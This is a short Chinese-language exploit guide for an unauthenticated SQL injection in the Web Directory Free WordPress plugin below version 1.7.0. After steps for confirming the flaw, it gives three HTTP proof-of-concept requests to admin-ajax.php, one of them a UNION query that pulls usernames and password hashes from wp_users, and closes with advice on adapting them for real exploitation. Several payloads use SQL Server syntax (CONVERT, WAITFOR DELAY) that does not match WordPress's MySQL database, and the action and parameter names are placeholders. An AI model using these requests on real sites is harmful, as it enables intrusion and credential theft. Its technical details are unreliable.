验证漏洞存在方法
    - 检查目标WordPress网站是否安装了Web Directory Free插件
    - 检查插件版本是否低于1.7.0
    - 尝试访问插件相关的AJAX端点，观察是否存在SQL注入漏洞

漏洞利用方法
    - 该漏洞存在于Web Directory Free WordPress插件的AJAX操作中，未经身份验证的用户可以访问
    - 由于参数未经过适当的清理和转义，攻击者可以通过构造恶意SQL语句进行注入攻击
    - 支持多种SQL注入技术：UNION注入、基于时间的盲注、基于错误的注入
    
    - **PoC示例（基于错误的注入）**:
      ```
      POST /wp-admin/admin-ajax.php HTTP/1.1
      Host: target.com
      Content-Type: application/x-www-form-urlencoded
      
      action=web_directory_free_ajax_action&parameter=' OR 1=CONVERT(INT,(SELECT @@version))--
      ```
      
    - **PoC示例（基于时间的盲注）**:
      ```
      POST /wp-admin/admin-ajax.php HTTP/1.1
      Host: target.com
      Content-Type: application/x-www-form-urlencoded
      
      action=web_directory_free_ajax_action&parameter='; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05'--
      ```
      
    - **PoC示例（UNION注入）**:
      ```
      POST /wp-admin/admin-ajax.php HTTP/1.1
      Host: target.com
      Content-Type: application/x-www-form-urlencoded
      
      action=web_directory_free_ajax_action&parameter=' UNION SELECT NULL,user_login,user_pass,NULL FROM wp_users--
      ```

**注意**: 实际利用时需要根据具体的AJAX操作名称和参数名称进行调整。建议先通过信息收集确定插件的具体AJAX端点。
